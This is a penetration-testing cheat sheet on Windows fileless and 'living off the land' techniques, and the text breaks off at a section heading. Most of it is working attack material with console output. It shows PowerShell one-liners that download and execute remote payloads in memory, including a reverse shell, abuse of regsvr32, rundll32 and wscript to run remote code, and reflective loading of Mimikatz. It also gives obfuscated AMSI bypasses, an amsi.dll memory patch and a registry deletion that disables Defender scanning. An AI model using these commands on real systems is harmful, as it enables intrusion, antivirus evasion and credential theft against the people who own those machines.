================================================================================================================================================
Living off the land and fileless techniques
================================================================================================================================================

INDEX
======

I.   Reminder & Definitions
     ➤ Why using 'living off the land and fileless' techniques ?
     ➤ Microsoft Antimalware Scan Interface (AMSI)
     ➤ Windows Security features and Microsoft security products

II.  Examples of "living off the land" techniques using PowerShell (i.e. download and execute straight into memory PE, DLL and PoSh scripts) 

III. Examples of "living off the land" techniques using LOLBAS (i.e. Living Off The Land Binaries, Scripts and Libraries)

IV.  Examples of AMSI bypass techniques (for PowerShell) to be able to download and execute straight into memory any offensive PowerShell scripts and .Net Assemblies 
     without being detected by AV products 
     ➤ Examples of AV bypass by forcing the AMSI initialization to fail in a PowerShell session 
     ➤ Examples of AV bypass by patching the AMSI DLL
     ➤ Examples of AV bypass by modifying a registry key to diasable the AMSI (admin priv required)
     ➤ Examples of AV bypass using the tool 'Evil-WinRM' (AMSI patching technique)

V.   Examples of techniques to bypass AV products and to download and execute straight into memory any offensive Portable Executable (PE) files
     without using PowerShell
     ➤ Example of AV bypass (fileless technique + ETW patching + NTDLL unhooking) using the tool 'FilelessRemotePE' (it runs only C/C++/ASM based binaries)
     ➤ Example of AV bypass (fileless technique + AMSI and ETW patching) using the tool 'ExecRemoteAssembly' 	    (it runs only .Net assemblies based on C#)
     ➤ Example of AV bypass (fileless technique + AMSI patching) using the tool 'EAPrimer'			    (it runs only .Net assemblies based on C#)


================================================================================================================================================
I. Reminder & Definitions
================================================================================================================================================

-----------------------------------------------------------------
1.1 Why using 'living off the land and fileless' techniques ?
-----------------------------------------------------------------
> The purpose of the 'living off the land and fileless' techniques is to avoid getting detected and blocked by the antivirus and end-point protection
  solutions installed on modern Windows machines during penetration tests by:
  - running scripts, portable executable files and shellcodes directly into memory  
  - using as much as possible legitimate sysadmin tools and software that are already installed on the targeted computers.
  
  The four main categories of living off the land and fileless attack techniques are: 
  - memory-only threats, 
  - fileless persistence, 
  - dual-use tools,
  - non-PE file attacks.

  In general, creating less new files on the hard disk means less chance of being detected by traditional security tools (i.e. AV) and therefore 
  minimizes the risk of an attack being detected and blocked.

  During a penetration test, before executing directly into memory a PowerShell script, a shellcode or a portable executable file (using the reflective PE-Loading technique)
  on a modern Windows machine it is recommended to disable the Antimalware Scan Interface (AMSI) to avoid our script, shellcode or PE file being scanned and potentially 
  blocked by the AV installed on the Windows machine.

-----------------------------------------------------------------
1.2 Microsoft Antimalware Scan Interface (AMSI)
-----------------------------------------------------------------
> The Microsoft Antimalware Scan Interface (AMSI) provides enhanced malware protection by allowing the Antivirus solution installed on a modern Windows machine
  (i.e. Windows 10/11 or Windows server 2016/2019) to scan the applications and scripts before they are executed. 
  
  For instance, the AMSI feature is integrated into these components of Windows 10 when they are executed:
  - User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
  - PowerShell (scripts, interactive use, and dynamic code evaluation)
  - Windows Script Host (wscript.exe and cscript.exe)
  - JavaScript and VBScript
  - Office VBA macros

> The Windows Antimalware Scan Interface (AMSI) is a versatile interface standard that allows the applications and services to integrate with any antimalware product
  that's present on a Windows machine (e.g. Windows Defender AntiVirus is enabled by default on Windows 10/11).
  AMSI is agnostic of antimalware vendor; it's designed to allow for the most common malware scanning and protection techniques provided
  by today's antimalware products that can be integrated into applications. 
  
> The AMSI protects PowerShell by loading AMSI’s DLL (amsi.dll) into the PowerShell’s memory space.
  It scans the PowerShell console input by using Windows Defender (or other AV) to determine whether to block the payload operation or allow it to continue.
  Prior to execution the following two API’s are used by the antivirus to scan the buffer and strings for signs of malware.
  - AmsiScanBuffer()
  - AmsiScanString()

> There are many techniques to bypass AMSI such as:
  - patching the amsi.dll in memory
  - setting the “amsiInitFailed” flag to prevent AMSI scanning capability for the current process (the strings 'AmsiUtils' & 'amsiInitFailed' are encoded to avoid the AV to detect and block the AMSI bypass)
  - forcing an error i.e. forcing the AMSI initialization to fail (amsiInitFailed) so no scan will be initiated for the current process
  - placing a separate amsi.dll in the current working directory (note: legacy technique)
  - registry key modification
  The goal of attackers is to prevent a scan from taking place or to deliver a “clean” result and not being flagged as “malicious”. 

  Usefull links:
  - https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
  - https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/
  - https://amsi.fail
  - https://cheatsheet.haax.fr/windows-systems/privilege-escalation/amsi_and_evasion/
  
-----------------------------------------------------------------
1.3 Windows Security features and Microsoft security products
-----------------------------------------------------------------
> PowerShell security features
  Microsoft has added some security features in PowerShell v5 to help out the Blue teams such as: 
  - Constrained Language Mode
    It is a setting in PowerShell that greatly limits what commands can be performed. This can potentially reduce the available attack surface to adversary's. 
  - Deep Script Block Logging
    It records block of code as they are executed therefore it captures the complete activity and full content of the script. 
    It maintains the complete audit trail of each activity which can be used later in forensics and to study the malicious behavior. 
    It records all the activity at time of execution thus provides the complete details.
    Everytime an adversary executes an encoded PowerShell script or command, script block logging provides that data in its raw form.
  - System-Wide Transcripts
    It creates a record of all or part of a PowerShell session to a text file. 
    The transcript includes all command that the user types and all output that appears on the console.
  - Antimalware Scan Interface (AMSI)  
  - ...

> Windows Defender AV
  - Real-Time protection and Antimalware Scan Interface (AMSI) 
  - Automatic and manual scanning
  - Tamper protection (prevents other form tampering with important security features)
  - Sample submissions
  - ...

> Software whitelisting using AppLocker 
  - AppLocker is an application whitelisting technology introduced with Microsoft's Windows 7 OS. It allows restricting which programs users 
    can execute based on the program's path, publisher, or hash, and in an enterprise can be configured via Group Policy.
  - AppLocker can control the following file types: Executables, DLLs, Scripts, Windows Installers, Packaged apps and installers.
  - AppLocker supports Windows 10/11 and Windows server 2016 and above.
  Note: Microsoft Software Restriction Policy (SRP) can still be used but is "deprecated". AppLocker is recommended for supported Windows OS.
  
> Windows Event Tracing (ETW) 
  - ETW provides a way to trace and log events from both user and kernel mode. 
  - It is used by AV and EDR to detect attacks.
  
> LSASS & Protected Process Light (PPL)
  - On Windows the Local Security Authority Subsystem is responsible for safeguarding the NTLM hashes, Kerberos tickets and anything that has to do with 
    authentication and authorization.
  - To prevent the bad guys from stealing credentials, a security feature called LSA (Local Security Authority) Protection Light was introduced.
  - RunAsPPL for LSASS is a true quick win. It is very easy to configure as the only thing you have to do is add a simple value in the registry and reboot. 
    Like any other protection though, it is not bulletproof and it is not sufficient on its own, but it is still particularly efficient. 
    Attackers will have to use some relatively advanced tricks if they want to work around it, which ultimately increases their chance of being detected.
    
> Windows Defender Credential Guard 
  - It uses virtualization-based security to isolate secrets so that only privileged system software can access them. 
    Unauthorized access to these secrets can lead to credential theft attacks, such as Pass-the-Hash or Pass-The-Ticket. 
    Windows Defender Credential Guard prevents these attacks by protecting NTLM password hashes, Kerberos Ticket Granting Tickets, and credentials stored 
    by applications as domain credentials.
  - By enabling Windows Defender Credential Guard, the following features and solutions are provided:
    + Hardware security NTLM, Kerberos, and Credential Manager take advantage of platform security features, including Secure Boot and virtualization, 
      to protect credentials.
    + Virtualization-based security Windows NTLM and Kerberos derived credentials and other secrets run in a protected environment that is isolated from 
      the running operating system.
    + Better protection against advanced persistent threats When Credential Manager domain credentials, NTLM, and Kerberos derived credentials are protected 
      using virtualization-based security, the credential theft attack techniques and tools used in many targeted attacks are blocked. Malware running in the 
      operating system with administrative privileges cannot extract secrets that are protected by virtualization-based security.

> Microsoft Defender for Endpoint (formerly known as Microsoft Defender Advanced Threat Protection (ATP))
  - It is a post-breach solution that complements Microsoft Defender AV.
  - It is an EDR that detects and remediates advanced attacks on endpoints. 
  
> The Windows Lockdown Policy (WLDP aka Device Guard) 
  - It checks the digital signature of dynamic code.


================================================================================================================================================
II.  Examples of "living off the land" techniques using PowerShell (i.e. download and execute straight into memory PE, DLL and PoSh scripts) 
================================================================================================================================================

PowerShell is built on .NET and it natively allows to download and execute straight into memory:
> PowerShell scripts
> .Net Assemblies (PE and DLL)
  Examples
   > Method 1 - Add assembly with Add-Type cmdletPermalink
   > Method 2 - Add assembly with Reflection Assembly
   > Method 3 - Add assembly via a string objectPermalink

In addition, with PowerShell, we can also download and execute straight into memory any Windows PE and DLL by using the reflective PE/DLL injection methods.

-----------------------------------------------------------------------------------------------------------------------------------------------
2.1. Examples of PowerShell scripts and commands that can be used to load remote (.NET) PE and DLL straight into memory
-----------------------------------------------------------------------------------------------------------------------------------------------

=> PowerSharpPack is a tool with many useful offensive CSharp Projects (mostly PEs) wraped into one PowerShell script that can be remotely loaded into memory for easy usage.
   + https://github.com/S3cur3Th1sSh1t/PowerSharpPack
   
=> The PowerShell script 'PowerLoader.ps1' builds script block which safely loads into-memory remote PowerShell script, .NET assemblies, and shellcodes.
   + https://github.com/tmenochet/PowerExec/blob/master/PowerLoader.ps1


In addtion, below are some examples of PowerShell commands that allow to manually download and inject straight into memory remote .Net Assemblies (PE and DLL)
and PowerShell scripts.
Keep in mind that to avoid AV detection it will necessary to bypass the AMSI (Refer to the next section).

2.1.1 Manually download and execute a .Net PE straight into memory using PowerShell
-------------------------------------------------------------------------------------------

PS C:\temp> $data = (New-Object System.Net.WebClient).DownloadData('http://YOUR_IP_ADDRESS/CsharpRevShell.exe')
PS C:\temp> $assem = [System.Reflection.Assembly]::Load($data)
PS C:\temp> [CsharpRevShell.Program]::Main("".Split())

OR

PS C:\temp> $bytes = (Invoke-WebRequest "http://YOUR_IP_ADDRESS/CsharpRevShell.exe").Content;
PS C:\temp> $assembly = [System.Reflection.Assembly]::Load($bytes);
PS C:\temp> $entryPointMethod = $assembly.GetType('ProcessInjection.Program', [Reflection.BindingFlags] 'Public, NonPublic').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic');
PS C:\temp> $entryPointMethod.Invoke($null, (, [string[]] ('', '')));


2.1.2 Manually download and execute a .NET DLL straight into memory using PowerShell
--------------------------------------------------------------------------------------------

PS C:\temp> $data = (New-Object System.Net.WebClient).DownloadData('http://YOUR_IP_ADDRESS/MyLibrary.dll')
PS C:\temp> $assem = [System.Reflection.Assembly]::Load($data)
PS C:\temp> $class = $assem.GetType("MyLibrary.Class1")
PS C:\temp> $method = $class.GetMethod("AwesomeFunctionName")
PS C:\temp> $method.Invoke(0, $null)

(note : https://github.com/crypt0jan/ClassLibrary1)

OR

+ Step 1 - Get a Base64 encoded string of the DLL
PS C:\temp> [convert]::ToBase64String((Get-Content -path "C:\PATH\MyLibrary.dll" -Encoding byte))

+ Step 2 - Embed assembly string in script 
PS C:\temp> $dll = 'TVqQAAMAAAAEAAAA//8AALgAAAAA...'
PS C:\temp> $bytes = [System.Convert]::FromBase64String($dll)
PS C:\temp> [System.Reflection.Assembly]::Load($bytes)


2.1.3 Manually download and execute a scripts straight into memory using PowerShell
-----------------------------------------------------------------------------------------

PS C:\temp> powershell -exec bypass
PS C:\temp> IEX (New-Object Net.WebClient).DownloadString('https://YOUR_IP_ADDRESS/Your-PowerShell-Script.ps1'); Your-PowerShell-script-function-name
- OR -
PS C:\temp> powershell -exec bypass
PS C:\temp> $payload = 'http://Your-IP-address/PowerShell-Script.ps1'
PS C:\temp> IEX (New-Object Net.WebClient).DownloadString($payload);
- OR -
C:\temp> echo IEX(New-Object Net.WebClient).DownloadString('http://Your-IP-address/PowerShell-Script.ps1') | powershell -noprofile - 
- OR -
C:\temp> powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://Your-IP-address/PowerShell-Script.ps1')|iex"


--------------------------------------------------------------------------------------------------------------------------------------------------
2.2. Examples of PowerShell scripts that can be used to load any Windows PE, DLL and shellcode straight into memory
--------------------------------------------------------------------------------------------------------------------------------------------------

OLD - The PowerSploit frameworks (https://github.com/PowerShellMafia/PowerSploit/CodeExecution/)

> Invoke-ReflectivePEInjection.ps1
  This script has two modes. It can reflectively load a DLL/EXE in to the PowerShell process, or it can reflectively load a DLL in to a remote process.
  
> Invoke-DllInjection.ps1
  This script injects a Dll into an arbitrary process. It does this by using VirtualAllocEx to allocate memory the size of the DLL in the remote process,
  writing the names of the DLL to load into the remote process spacing using WriteProcessMemory, and then using RtlCreateUserThread to invoke LoadLibraryA 
  in the context of the remote process.

> Invoke-Shellcode.ps1
  Inject shellcode into the process ID of your choosing or within the context of the running PowerShell process.


PoC with Mimkatz.exe and Invoke-ReflectivePEInjection.ps1
-----------------------------------------------------------

Step 1 - Encode in Base64 the Windows PE 'Mimikatz.exe'
- - -  - - - - - - - - - - - - - - - - - - - - - - - - -
PS C:\temp> $SourceFile = "C:\temp\mimikatz.exe"
PS C:\temp> $Base64File = "C:\temp\mimi-encoded.txt"
PS C:\temp> [IO.File]::WriteAllBytes($Base64File,[char[]][Convert]::ToBase64String([IO.File]::ReadAllBytes($SourceFile)))
PS C:\temp> ls
    Directory: C:\temp
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        29/12/2022     04:11        1807020 mimi-encoded.txt
-a----        19/09/2022     17:44        1355264 mimikatz.exe


Step 2 - Add the following lines at the end of the script 'Invoke-ReflectivePEInjection.ps1' and rename it to 'Invoke-ReflectivePEInjection-Custom.ps1'
- - -  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function Execute-Mimi-with-ReflectivePEInjection {
$InputString = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAA.....  //content of 'mimi-encoded.txt'
$PEBytes = [System.Convert]::FromBase64String($InputString)
Invoke-ReflectivePEInjection -PEBytes $PEBytes
}
PS C:\temp> ls
    Directory: C:\temp
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a---         29/12/2022     04:33        1942980 Invoke-ReflectivePEInjection-Custom.ps1
-a---         29/12/2022     04:11        1807020 mimi-encoded.txt
-a---         19/09/2022     17:44        1355264 mimikatz.exe


Step 3 - Load the tool Mimikatz 'reflectively' from memory using'Invoke-ReflectivePEInjection-Custom.ps1'
- - -  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
PS C:\temp> 
PS C:\temp> powershell -version 2
Windows PowerShell
Copyright (C) 2009 Microsoft Corporation. All rights reserved.

PS C:\temp> . .\Invoke-ReflectivePEInjection-Custom.ps1
PS C:\temp> Execute-Mimi-with-ReflectivePEInjection

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # 
mimikatz # coffee

    ( (
     ) )
  .______.
  |      |]
  \      /
   `----'

mimikatz #


================================================================================================================================================
III. Examples of "living off the land" techniques using the LOLBAS project (i.e. Living Off The Land Binaries, Scripts and Libraries)
================================================================================================================================================

The goal of the 'LOLBAS' project is to document every binary, script, and library that can be used for Living Off The Land techniques.

=> https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/
=> https://lolbas-project.github.io/lolbas/Binaries/Rundll32/
=> https://lolbas-project.github.io/#remote
=> https://github.com/LOLBAS-Project/LOLBAS#criteria

--------------------------------------------------------------------------------------------
Example of LOLBAS n°1 - Regsvr32.exe (Used by Windows to register dlls)
--------------------------------------------------------------------------------------------

Execute the specified remote .SCT script with scrobj.dll.
> regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll

--------------------------------------------------------------------------------------------
Example of LOLBAS n°2 - Rundll32.exe (Used by Windows to execute dll files)
--------------------------------------------------------------------------------------------

Use Rundll32.exe to execute a DLL from a SMB share. EntryPoint is the name of the entry point in the .DLL file to execute (i.e. execute DLL from SMB share.)
> rundll32.exe \\10.10.10.10\share\payload.dll,EntryPoint

Use Rundll32.exe to execute a JavaScript script that runs a PowerShell script that is downloaded from a remote web site (i.e. execute code from Internet)
> rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');")

--------------------------------------------------------------------------------------------
Example of LOLBAS n°3 - Remote.exe (Debugging tool included with Windows Debugging Tools)
--------------------------------------------------------------------------------------------

It is Debugging tool included with Windows Debugging Tools that can be used to execute a remote binary without saving file to disk.
> C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\Remote.exe /s "\\10.10.10.30\binaries\file.exe" anythinghere

It can also be used to launch PowerShell...
> C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\Remote.exe /s "powershell.exe" anythinghere

--------------------------------------------------------------------------------------------
Example of LOLBAS n°4 - Wscript.exe (Used by Windows to execute scripts)
--------------------------------------------------------------------------------------------

Execute hidden code to evade defensive counter measures by downloading a remote script and storing it in an alternate data stream.
> echo GetObject("script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js") > %temp%\test.txt:hi.js && wscript.exe %temp%\test.txt:hi.js


==================================================================================================================================================
IV.  Examples of AMSI bypass techniques (for PowerShell) to be able to download and execute straight into memory any offensive PowerShell scripts 
     and .Net Assemblies (PE & DLL) without being detected by AV products 
==================================================================================================================================================

-------------------------------------------------------------------------------------------------------------------------------
4.1 Examples of AV bypass by forcing the AMSI initialization to fail in a PowerShell session
-------------------------------------------------------------------------------------------------------------------------------

Test 1 - AMSI bypass as a low privileged user locally logged on a Windows 10 laptop with Defender (AV) enabled and up-to-date
-------------------------------------------------------------------------------------------------------------------------------

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\auditor> powershell -exec bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\auditor> net user auditor
User name                    auditor
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            11/21/2021 4:48:04 AM
Password expires             1/2/2022 4:48:04 AM
Password changeable          11/21/2021 4:48:04 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   11/21/2021 4:52:08 AM

Logon hours allowed          All

Local Group Memberships      *Users
Global Group memberships     *None
The command completed successfully.

PS C:\temp> cd c:\temp

PS C:\temp> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
<SNIP>
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParseException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent

PS C:\temp> $Hxl=$null;
PS C:\temp> $xqhoooo="$([cHAr](83*54/54)+[CHAR]([bYTe]0x79)+[chaR]([BytE]0x73)+[cHAR]([ByTE]0x74)+[chAR]([BYte]0x65)+[chAr]([BYTE]0x6d)).$(('Mänäg'+'ement').NORmAlize([ChAr](13+57)+[cHAr]([BytE]0x6f)+[CHAR](40+74)+[cHaR](92+17)+[CHAr](68+27-27)) -replace [ChAr]([BYte]0x5c)+[CHar](112)+[chAR]([byte]0x7b)+[chAr](77*64/64)+[ChaR](110)+[char](125*63/63)).$(('Autóm'+'âtíon').nOrmALIZE([char]([BYtE]0x46)+[CHAr]([BYtE]0x6f)+[ChaR](114+1-1)+[ChaR]([ByTe]0x6d)+[chaR](68)) -replace [cHar]([ByTE]0x5c)+[cHAR]([bYTe]0x70)+[cHAR]([byTe]0x7b)+[cHAR]([byte]0x4d)+[CHar](110+94-94)+[cHAR]([BYtE]0x7d)).$([chAR]([bYTE]0x41)+[CHAR]([byTE]0x6d)+[ChAR]([ByTE]0x73)+[chaR](105+6-6)+[ChaR](85+23-23)+[cHAR](116*86/86)+[cHar](105)+[cHar]([BYtE]0x6c)+[cHAr](115))";
PS C:\temp> $wpkfsoadsfehqpe="+[cHAR]([bytE]0x72)+[ChAr](121)+[chAR]([bYtE]0x79)+[cHar](97+3)+[cHar](121+41-41)+[cHAr]([bYte]0x6f)+[cHar]([BYTe]0x66)+[chAr](107+87-87)+[chAr]([BYTE]0x69)";
PS C:\temp> [Threading.Thread]::Sleep(286);
PS C:\temp> [Ref].Assembly.GetType($xqhoooo).GetField($([char](71+26)+[char]([BYtE]0x6d)+[CHar]([byte]0x73)+[chaR](105+75-75)+[CHar]([ByTe]0x49)+[chAr]([bytE]0x6e)+[CHar](37+68)+[cHAr](116+2-2)+[Char](70+37-37)+[char](97)+[chAR]([BYTE]0x69)+[chaR](93+15)+[CHAr]([byte]0x65)+[char](100)),"NonPublic,Static").SetValue($Hxl,$true);

PS C:\temp> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks

[*] Running Invoke-AllChecks
[*] Checking if user is in a local group with administrative privileges...
[*] Checking for unquoted service paths...
[*] Checking service executable and argument permissions...
[*] Checking service permissions...
[*] Checking %PATH% for potentially hijackable .dll locations...
HijackablePath : C:\Users\auditor\AppData\Local\Microsoft\WindowsApps\
AbuseFunction  : Write-HijackDll -OutputFile 'C:\Users\auditor\AppData\Local\Microsoft\WindowsApps\\wlbsctrl.dll'
                 -Command '...'

[*] Checking for AlwaysInstallElevated registry key...
[*] Checking for Autologon credentials in registry...
[*] Checking for vulnerable registry autoruns and configs...
[*] Checking for vulnerable schtask files/configs...
[*] Checking for unattended install files...
[*] Checking for encrypted web.config strings...
[*] Checking for encrypted application pool and virtual directory passwords...

PS C:\temp>


Test 2 - AMSI bypass as a local admin user remotely logged on a Window 2016 server with Defender (AV) enabled and up-to-date
------------------------------------------------------------------------------------------------------------------------------------------------

PS C:\> Enter-PSSession -Computername server02.Security-Test-Lab.Local -Credential server02\administrator
[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> 

=> Note: Without disabling the AMSI, the script 'Invoke-Rubeus.ps1' is detected and blocked by Windows Defender...

[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1');Invoke-Rubeus
<SNIP>
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParseException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent

=> Now let's disable the AMSI and re-run 'Invoke-Rubeus'.

[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> $a = [Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iutils") {$c = $b}};$d = $c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*itFailed") {$f = $e}};$f.SetValue($null,$true)
[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents> 
[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents>  IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1');
[server02.Security-Test-Lab.Local]: PS C:\Users\administrator\Documents>  Invoke-Rubeus
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4
<SNIP>


------------------------------------------------------------------------------------------------------------------------------------------------
4.2 Examples of AV bypass by patching the AMSI DLL
------------------------------------------------------------------------------------------------------------------------------------------------


PoC / Technique n°1
--------------------

=> Source: https://gist.github.com/FatRodzianko/c8a76537b5a87b850c7d158728717998

C:\Users\Auditor\Desktop>powershell -exec bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\Auditor\Desktop> amsiscanbuffer
At line:1 char:1
+ amsiscanbuffer
+ ~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent


PS C:\Users\Auditor\Desktop> & '.\Invoke-AM$1-patch.ps1'
True

PS C:\Users\Auditor\Desktop> amsiscanbuffer
amsiscanbuffer : The term 'amsiscanbuffer' is not recognized as the name of a cmdlet,function, script file, or operable program. 
Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ amsiscanbuffer
+ ~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (amsiscanbuffer:String) [], CommandNotFoundEx
   ception
    + FullyQualifiedErrorId : CommandNotFoundException


PoC / Technique n°2
---------------------

=> Good article: https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/

PS C:\Users\Administrator> amsiscanstring
At line:1 char:1
+ amsiscanstring
+ ~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent

PS C:\Users\Administrator> ${_/==\_/\__/===\_/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGkAbgBnACAAUwB5AHMAdABlAG0AOwA
NAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwANAAoAcAB1AGIAbABpAGMAIABjAGwAYQBzAHMAIABXAGkAbgA
zADIAIAB7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQB
yAG4AIABJAG4AdABQAHQAcgAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAoAEkAbgB0AFAAdAByACAAaABNAG8AZAB1AGwAZQAsACAAcwB0AHIAaQBuAGcAIABwAHIAbwBjAE4AYQBtAGUAKQA
7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIA
BJAG4AdABQAHQAcgAgAEwAbwBhAGQATABpAGIAcgBhAHIAeQAoAHMAdAByAGkAbgBnACAAbgBhAG0AZQApADsADQAKACAAIAAgACAAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAM
wAyACIAKQBdAA0ACgAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwAIABWAGkAcgB0AHUAYQBsAFAAcgBvAHQAZQBjAHQAKABJAG4AdABQAHQ
AcgAgAGwAcABBAGQAZAByAGUAcwBzACwAIABVAEkAbgB0AFAAdAByACAAZAB3AFMAaQB6AGUALAAgAHUAaQBuAHQAIABmAGwATgBlAHcAUAByAG8AdABlAGMAdAAsACAAbwB1AHQAIAB1AGkAbgB0A
CAAbABwAGYAbABPAGwAZABQAHIAbwB0AGUAYwB0ACkAOwANAAoAfQA=')))
PS C:\Users\Administrator> Add-Type ${_/==\_/\__/===\_/}
PS C:\Users\Administrator> ${__/=\/==\/\_/=\_/} = [Win32]::LoadLibrary("am" + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBpAC4AZABsAGwA'))))
PS C:\Users\Administrator> ${___/====\__/=====} = [Win32]::GetProcAddress(${__/=\/==\/\_/=\_/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQA=')))
+ $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGEAbgA='))) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIA'))))
PS C:\Users\Administrator> ${/==\_/=\/\__/\/\/} = 0
PS C:\Users\Administrator> [Win32]::VirtualProtect(${___/====\__/=====}, [uint32]5, 0x40, [ref]${/==\_/=\/\__/\/\/}) 
True
PS C:\Users\Administrator> ${_/\__/=\/\___/==\} = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
PS C:\Users\Administrator> [System.Runtime.InteropServices.Marshal]::Copy(${_/\__/=\/\___/==\}, 0, ${___/====\__/=====}, 6)


PS C:\Users\Administrator> amsiscanstring
amsiscanstring : The term 'amsiscanstring' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a
path was included, verify that the path is correct and try again.
At line:1 char:1
+ amsiscanstring
+ ~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (amsiscanstring:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException



------------------------------------------------------------------------------------------------------------------------------------------------
4.3 Example of AV bypass technique by modifying a registry key to disable the AMSI (admin priv required)
------------------------------------------------------------------------------------------------------------------------------------------------

AMSI Providers are responsible for the scanning process by the antivirus product and are registered in a location in the registry. 
The GUID for Windows Defender is: HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}
We can remove the registry key to bypass/disable the AMSI if we have local administrator privileges but it is not stealth.

PS C:\> Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse


------------------------------------------------------------------------------------------------------------------------------------------------
4.4 Examples of AV bypass using the tool 'Evil-WinRM' (AMSI patching technique)
